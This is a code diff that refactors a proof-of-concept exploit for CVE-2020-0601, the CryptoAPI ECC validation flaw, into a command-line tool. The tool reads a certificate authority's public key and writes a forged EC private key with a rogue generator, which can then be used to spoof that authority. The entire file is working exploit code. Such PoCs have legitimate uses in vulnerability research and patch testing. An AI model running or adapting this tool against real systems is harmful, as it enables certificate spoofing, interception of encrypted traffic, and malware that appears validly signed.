@@ -1,62 +1,96 @@
-# pylint: disable=line-too-long, unsupported-assignment-operation, unsubscriptable-object
+# pylint: disable=line-too-long, import-error, no-value-for-parameter, unsupported-assignment-operation, unsubscriptable-object, ungrouped-imports, invalid-name
 """
 gen_key is a CVE-2020-0601 PoC written by the people at https://github.com/kudelskisecurity/chainoffools
 """
+import os
 
+from base64 import b64decode
+from binascii import hexlify
 from binascii import unhexlify
 
+import click
 import gmpy2
 
 from Crypto.IO import PEM
+from fastecdsa.curve import P384
+from fastecdsa.point import Point
 from Crypto.Util.asn1 import DerSequence
 from Crypto.Util.asn1 import DerBitString
 from Crypto.Util.asn1 import DerOctetString
 
-from fastecdsa.curve import P384
-from fastecdsa.point import Point
 
-# USERTrust ECC Certification Authority public key
-PUBKEY = b"1aac545aa9f96823e77ad5246f53c65ad84babc6d5b6d1e67371aedd9cd60c61fddba08903b80514ec57ceee5d3fe221b3cef7d48a79e0a3837e2d97d061c4f199dc259163ab7f30a3b470e2c7a1339cf3bf2e5c53b15fb37d327f8a34e37979"
-Q = Point(int(PUBKEY[0:96], 16), int(PUBKEY[96:], 16), curve=P384)
+def get_public_key(certificate_path: str) -> bytes:
+    """
+    given a valid certificate_path return public key
+    """
+    with open(certificate_path) as handle:
+        raw_cert = handle.read()
+    cert_body = b64decode(
+        raw_cert.replace("-----BEGIN CERTIFICATE-----", "").replace("-----END CERTIFICATE-----", "").replace("\n", "")
+    )
+    der_cert = DerSequence()
+    der_cert.decode(cert_body)
+    tbs_cert = DerSequence()
+    tbs_cert.decode(der_cert[0])
+    pub = tbs_cert[6][24:]
 
-# Generate rogue generator
-PRIVKEY_INV = 2
-# we take the private key as being the inverse of 2 modulo the curve order
-PRIVKEY = gmpy2.invert(PRIVKEY_INV, P384.q) # pylint: disable=c-extension-no-member
-PRIVKEY = unhexlify(f"{PRIVKEY:x}".encode())
-# we multply our public key Q with the inverse of our chosen private key value
-ROUG_G = PRIVKEY_INV * Q
-ROUG_G = unhexlify(b"04" + f"{ROUG_G.x:x}".encode() + f"{ROUG_G.y:x}".encode())
+    return hexlify(pub)
 
-# Generate the file with explicit parameters
-with open("p384-key.pem", mode="rt") as handle:
-    KEYFILE = PEM.decode(handle.read())
-# print(hexlify(KEYFILE[0]))
 
-SEQ_DER = DerSequence()
-DER = SEQ_DER.decode(KEYFILE[0])
+def forge(certificate_path: str, key_pem: str):
+    """
+    given a valid certificate_path and key_pem create a forged key
+    """
+    public_key_point = get_public_key(certificate_path)
+    Q = Point(int(public_key_point[0:96], 16), int(public_key_point[96:], 16), curve=P384)
 
-# Replace private key
-OCTET_DER = DerOctetString(PRIVKEY)
-DER[1] = OCTET_DER.encode()
+    # Generate rogue generator
+    privkey_inv = 2
+    # we take the private key as being the inverse of 2 modulo the curve order
+    private_key = gmpy2.invert(privkey_inv, P384.q)  # pylint: disable=c-extension-no-member
+    private_key = unhexlify(f"{private_key:x}".encode())
+    # we multply our public key Q with the inverse of our chosen private key value
+    roug_g = privkey_inv * Q
+    roug_g = unhexlify(b"04" + f"{roug_g.x:x}".encode() + f"{roug_g.y:x}".encode())
 
-# Replace public key
-# print(hexlify(der[3]))
-BITS_DIR = DerBitString(unhexlify(b"04" + PUBKEY))
-DER[3] = b"\xa1\x64" + BITS_DIR.encode()
-# print(hexlify(der[3]))
+    # Generate the file with explicit parameters
+    with open(key_pem, mode="rt") as handle:
+        keyfile = PEM.decode(handle.read())
 
-# Replace the generator
-# print(hexlify(der[2]))
-SEQ_DER = DerSequence()
-S = SEQ_DER.decode(DER[2][4:])
-OCTET_DER = DerOctetString(ROUG_G)
-S[3] = OCTET_DER.encode()
-DER[2] = DER[2][:4] + S.encode()
-# print(hexlify(der[2]))
+    seq_der = DerSequence()
+    der = seq_der.decode(keyfile[0])
 
-# Generate new file
-with open("p384-key-rogue.pem", mode="w") as handle:
-    # print(hexlify(der.encode()))
-    KEYFILE = PEM.encode(DER.encode(), "EC PRIVATE KEY")
-    handle.write(KEYFILE)
+    # Replace private key
+    octet_der = DerOctetString(private_key)
+    der[1] = octet_der.encode()
+
+    # Replace public key
+    bits_der = DerBitString(unhexlify(b"04" + public_key_point))
+    der[3] = b"\xa1\x64" + bits_der.encode()
+
+    # Replace the generator
+    seq_der = DerSequence()
+    s = seq_der.decode(der[2][4:])  # pylint: disable=invalid-name
+    octet_der = DerOctetString(roug_g)
+    s[3] = octet_der.encode()
+    der[2] = der[2][:4] + s.encode()
+
+    return PEM.encode(der.encode(), "EC PRIVATE KEY")
+
+
+@click.command()
+@click.option("-p", "--cert-path", default=os.getenv("EC_CERT"), help="Full path to EC certificate")
+@click.option("-o", "--output", default="spoofed_ca.key", help="Full output path to write forged certificate to")
+@click.option("-k", "--key-pem", default="p384.key", help="Full path to key pem")
+@click.option("-d", "--debug", is_flag=True, default=False, help="Debug does not write keys to dick")
+def cli(cert_path: str, output: str, key_pem, debug: bool):
+    """Create forged key from EC certificate"""
+    keyfile = forge(cert_path, key_pem)
+    if debug:
+        return
+    with open(output, "w") as handle:
+        handle.write(keyfile)
+
+
+if __name__ == "__main__":
+    cli()
